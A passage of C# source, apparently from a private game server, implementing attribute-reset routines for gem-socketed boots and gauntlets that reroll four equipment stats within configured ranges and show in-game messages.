						AddItemWithProperties(World.宝珠鞋子传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num2 + 1, Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), num3 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num4 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num4 + 1, Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num5 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num6 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num5 + 1, num6 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num7 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num8 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num7 + 1, Convert.ToInt32(array[5]), num8 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num9 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num10 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num9 + 1, num10 + 1, Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num11 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num13 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num14 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num11 + 1, num13 + 1, num14 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num15 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num16 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num17 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num15 + 1, num16 + 1, num17 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num18 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num19 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num20 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num18 + 1, Convert.ToInt32(array[3]), num19 + 1, num20 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num21 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num22 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num24 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num21 + 1, num22 + 1, Convert.ToInt32(array[5]), num24 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num25 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num26 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), num25 + 1, num26 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num27 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num27 + 1, Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num28 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), num28 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num29 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), num29 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						系统提示("属性已洗完美,请勿重复操作", 50, "温馨提示");
					}
					else
					{
						系统提示("恭喜少侠，属性已重洗成功", 50, "温馨提示");
					}
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "属性重置出错! [" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 重置宝珠护手属性系统()
		{
			try
			{
				if (World.是否开启咕咕鸡属性重置 == 1)
				{
					Random random = new Random();
					string[] array = World.宝珠护手属性.Split(';');
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num12 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num23 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num30 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num + 1, num12 + 1, num23 + 1, num30 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num31 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num32 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num31 + 1, Convert.ToInt32(array[3]), num32 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num33 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num34 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num35 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num33 + 1, Convert.ToInt32(array[3]), num34 + 1, num35 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num2 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num3 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num2 + 1, Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), num3 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num4 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num4 + 1, Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num5 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num6 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num5 + 1, num6 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num7 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num8 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num7 + 1, Convert.ToInt32(array[5]), num8 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num9 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num10 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num9 + 1, num10 + 1, Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num11 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num13 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num14 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num11 + 1, num13 + 1, num14 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num15 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num16 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num17 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num15 + 1, num16 + 1, num17 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num18 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num19 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num20 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num18 + 1, Convert.ToInt32(array[3]), num19 + 1, num20 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num21 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num22 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num24 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num21 + 1, num22 + 1, Convert.ToInt32(array[5]), num24 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num25 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num26 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), num25 + 1, num26 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num27 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num27 + 1, Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num28 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), num28 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num29 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), num29 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						系统提示("属性已洗完美,请勿重复操作", 50, "温馨提示");
					}
					else
					{
						系统提示("恭喜少侠，属性已重洗成功", 50, "温馨提示");
					}
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "属性重置出错! [" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 重置宝珠护手高级属性系统()
		{
			try
			{
				if (World.是否开启咕咕鸡属性重置 == 1)
				{
					Random random = new Random();
					string[] array = World.宝珠护手高级属性.Split(';');
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num12 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num23 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num30 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
